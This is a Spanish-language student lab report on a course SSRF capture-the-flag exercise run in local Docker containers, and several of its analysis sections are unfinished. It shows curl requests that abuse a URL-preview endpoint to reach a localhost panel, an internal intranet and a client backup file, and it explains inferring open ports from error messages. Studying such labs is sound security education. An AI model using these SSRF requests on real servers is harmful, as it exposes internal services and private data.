# Informe de análisis — Lab Extra SSRF

**Grupo:** 10  
**Integrantes:** Carolina Paula Corazza — @carocor1; Belén Rocío Ramello — @belramello; Chiara Agustina Kordek — @chiarakordek; Juan Pablo Saby — @JuanSaby.  
**Fecha:** Pendiente de entrega.  
**Entorno:** laboratorio SSRF local de la cátedra, ejecutado en contenedores Docker aislados.

## Declaración de uso de IA

Se utilizó OpenCode como apoyo para organizar la evidencia de práctica y preparar un borrador de la respuesta R1. Los comandos y resultados se contrastaron con las respuestas observadas en el entorno Docker local y con el estado oficial de `./ctf status extra`.

## 1. Cadena de explotación

Las pruebas se realizaron únicamente contra los contenedores locales de la cátedra. Desde la consola atacante, el portal público `http://phantomcorp/` respondió y mostró el formulario “Previsualizar URL”. En cambio, al intentar acceder directamente a `http://phantomcorp-intra/`, el nombre no pudo resolverse (`curl: (6) Could not resolve host`, HTTP 000). Este resultado registra un fallo de resolución desde esa consola; por sí solo no permite concluir si además existía una ruta de red.

### R1 — Panel interno en localhost

La herramienta de previsualización envía al servidor una URL indicada por el usuario y devuelve el contenido obtenido. Como primera prueba de localhost, se pidió `http://127.0.0.1:1/` a través de `/preview` para observar la respuesta ante un puerto sin servicio:

```bash
curl -sS --max-time 3 "http://phantomcorp/preview?url=http%3A%2F%2F127.0.0.1%3A1%2F"
```

La respuesta mostró:

```text
No pude traer http://127.0.0.1:1/: <urlopen error [Errno 111] Connection refused>
```

La respuesta fue `Connection refused`, señal de que no había un servicio aceptando conexiones en ese puerto. Para elegir el siguiente puerto no hicimos un barrido: revisamos el código provisto para el entorno (`labs/labextra-ssrf/entorno/web/server.py`), que indica que el panel interno escucha en `127.0.0.1:9000`. Luego comprobamos ese servicio mediante la misma funcionalidad vulnerable:

```bash
curl -sS --max-time 3 "http://phantomcorp/preview?url=http%3A%2F%2F127.0.0.1%3A9000%2F"
```

el servidor devolvió el panel interno, que explícitamente se identifica como “solo localhost”, junto con la flag:

```html
<h2>PhantomCorp — Panel interno (solo localhost)</h2>
<p>Si estás viendo esto desde afuera, algo salió mal.</p>
<p>Deploy key: <b>FLAG{ssrf_localhost_panel_interno}</b></p>
```

Esto demuestra que el servidor público hizo la petición a `127.0.0.1:9000` desde su propio contexto y devolvió la respuesta a través de `/preview`. La diferencia entre el error de conexión rechazada y la respuesta HTTP del panel permite inferir qué puerto local acepta conexiones; es un oráculo de estado de puertos limitado por las respuestas observables. No implica ejecución de comandos ni una shell.

### R2 — Intranet en la red interna

El nombre `phantomcorp-intra` estaba indicado por el escenario y seguía el patrón de nombres usado en el laboratorio. Se solicitó la raíz de ese host a través de la previsualización:

```bash
curl -sS --max-time 5 "http://phantomcorp/preview?url=http%3A%2F%2Fphantomcorp-intra%2F"
```

La respuesta incluyó la página interna:

```html
<h1>Intranet PhantomCorp</h1>
<p><b>USO INTERNO.</b> Si la estás viendo desde afuera, avisá a Seguridad.</p>
<p>Host: <b>FLAG{ssrf_intranet_descubierta}</b></p>
<li>
  <a href="/backups/clientes.json">backup de clientes (temporal, borrar!)</a>
</li>
```

La consola atacante no pudo resolver directamente ese nombre, pero el servidor público pudo consultarlo desde su red interna y devolvió el contenido por `/preview`. Esta prueba demuestra el acceso indirecto a la página interna mediante SSRF; no demuestra por sí sola que la consola atacante tenga una ruta directa a esa red.

### R3 — Lectura del backup de clientes

La página de la intranet reveló el recurso `/backups/clientes.json`. Se solicitó ese recurso a través del mismo mecanismo:

```bash
curl -sS --max-time 5 "http://phantomcorp/preview?url=http%3A%2F%2Fphantomcorp-intra%2Fbackups%2Fclientes.json"
```

La respuesta relevante fue:

```json
{
  "_aviso": "backup temporal pre-migracion. NO deberia ser accesible.",
  "clientes": [
    { "id": 1, "empresa": "Aconcagua SRL", "cuit": "30-70998877-1" },
    { "id": 2, "empresa": "Comechingones SA", "cuit": "30-71554433-6" }
  ],
  "integridad": "FLAG{ssrf_backup_clientes}"
}
```

Esto demuestra la lectura, mediante SSRF, de un backup interno con dos registros de clientes y sus CUIT. No hay evidencia en esta prueba de uso posterior de los datos ni de su envío a un tercero.

## 2. Evidencia de progreso

La salida de `./ctf status extra` confirmó los tres retos completados:

```text
PROGRESO · LAB extra
✓  R1  El server fetchea por vos: panel interno en localhost
✓  R2  Descubrir la intranet en la red interna
✓  R3  Exfiltrar datos sensibles a traves del SSRF
3/3 (100%)
[ OK ] ¡Lab extra COMPLETO! Ponete las pilas con la próxima unidad.
```

## 3. Preguntas de análisis

### P1 — Modelo de confianza por red

La frase “la intranet no es alcanzable desde afuera” dejó de ser cierta porque el servidor público `phantomcorp`, que recibe peticiones desde la consola atacante, también está conectado a la red interna. La prueba directa desde la consola no resolvió `phantomcorp-intra`; sin embargo, al pedirle al servidor que previsualizara `http://phantomcorp-intra/`, `/preview` devolvió la portada de la intranet (R2). El componente que hizo posible el acceso fue la función de previsualización: el servidor consultó la URL desde su propia posición de red y actuó como intermediario. Así, la segmentación por sí sola no impidió que un usuario alcanzara indirectamente recursos internos a través de un servidor expuesto que acepta URLs arbitrarias.

### P2 — Errores como oráculo de puertos

_Pendiente de redacción y revisión por Belén._

### P3 — Hallazgo profesional

_Pendiente de revisión por Chiara._

### P4 — Mitigaciones

_Pendiente de respuesta por Juan._

### P5 — SSRF y metadata service cloud

_Pendiente de respuesta por Juan._

## 4. Conclusión ejecutiva

_Pendiente de redacción grupal._
